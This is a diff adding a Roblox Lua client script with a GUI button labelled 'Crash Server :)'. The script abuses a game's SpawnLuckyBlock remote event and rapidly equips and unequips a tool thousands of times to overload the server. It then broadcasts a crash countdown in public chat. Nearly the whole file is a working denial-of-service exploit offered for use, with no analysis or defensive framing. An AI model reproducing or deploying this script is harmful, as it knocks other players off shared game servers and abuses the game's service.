@@ -1,0 +1,90 @@
+-- Gui to Lua
+-- Version: 3.2
+
+-- Instances:
+
+local ScreenGui = Instance.new("ScreenGui")
+local Frame = Instance.new("Frame")
+local TextButton = Instance.new("TextButton")
+local UICorner = Instance.new("UICorner")
+local UICorner_2 = Instance.new("UICorner")
+
+--Properties:
+
+ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+
+Frame.Parent = ScreenGui
+Frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+Frame.BorderColor3 = Color3.fromRGB(0, 0, 0)
+Frame.Position = UDim2.new(-0.000590339303, 0, 0.914675713, 0)
+Frame.Size = UDim2.new(0, 142, 0, 75)
+
+TextButton.Parent = Frame
+TextButton.BackgroundColor3 = Color3.fromRGB(104, 0, 0)
+TextButton.Position = UDim2.new(0.096210964, 0, 0.0933333337, 0)
+TextButton.Size = UDim2.new(0, 114, 0, 61)
+TextButton.Font = Enum.Font.SourceSans
+TextButton.Text = "Crash Server :)"
+TextButton.TextColor3 = Color3.fromRGB(0, 0, 0)
+TextButton.TextSize = 14.000
+
+UICorner.Parent = TextButton
+
+UICorner_2.Parent = Frame
+
+TextButton.MouseButton1Down:connect(function()
+	local Char = game.Players.localPlayer.Character
+	local hum = Char.Humanoid
+	local Timer = 50
+	local Crash = 0
+	local cam = workspace.CurrentCamera
+
+	game:GetService("StarterGui"):SetCoreGuiEnabled(Enum.CoreGuiType.Backpack, false)
+
+	cam.CameraType = Enum.CameraType.Fixed
+	cam.Focus = CFrame.new(Vector3.new(0, -9e6, 0))
+
+	Char.HumanoidRootPart.CFrame = CFrame.new(-9e6,9e6,-9e6)
+	wait(0.2)
+	Char.Torso.Anchored = true
+	game.CoreGui.RobloxGui:Remove()
+
+	repeat
+		game:GetService("ReplicatedStorage").SpawnLuckyBlock:FireServer()
+		game:GetService("RunService").RenderStepped:wait()
+	until game.Players.LocalPlayer.Backpack:FindFirstChild("HalloweenBowAndArrow")
+
+	game.StarterGui:SetCore("ChatMakeSystemMessage", {
+		Text = "The Server will crash in 1 minute and 30 Seconds";
+		Color = Color3.fromRGB(94,176,0);
+		Font = Enum.Font.SourceSansBold;
+		FontSize = Enum.FontSize.Size96;
+	})
+
+	for i = 1, 5020 do
+		game:GetService("RunService").RenderStepped:wait()
+		Char.Head.Transparency = 0
+		game.Players.LocalPlayer.Backpack:FindFirstChild("HalloweenBowAndArrow").Parent = Char
+		hum:UnequipTools()
+	end
+	game.Players.LocalPlayer.Backpack:FindFirstChild("HalloweenBowAndArrow").Parent = Char
+
+	Char.HalloweenBowAndArrow.Handle.Mesh:Remove()
+	Char.HalloweenBowAndArrow.PumpkinHead.Mesh:Remove()
+	Char.HalloweenBowAndArrow.PumpkinHead:BreakJoints()
+	Char.HalloweenBowAndArrow.PumpkinHead.Position = Vector3.new(-9e6,9e6,-9e6)
+	Char.Head.Transparency = 0
+
+	while Timer > Crash  do
+		game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("In " .. (Timer) .. " Seconds this server will crash", "All")
+		Timer = Timer - 5
+		wait(5)
+	end
+	wait(3)
+	game.StarterGui:SetCore("ChatMakeSystemMessage", {
+		Text = "Server Crashed";
+		Color = Color3.fromRGB(176,0,0);
+		Font = Enum.Font.SourceSansBold;
+		FontSize = Enum.FontSize.Size96;
+	})
+end)
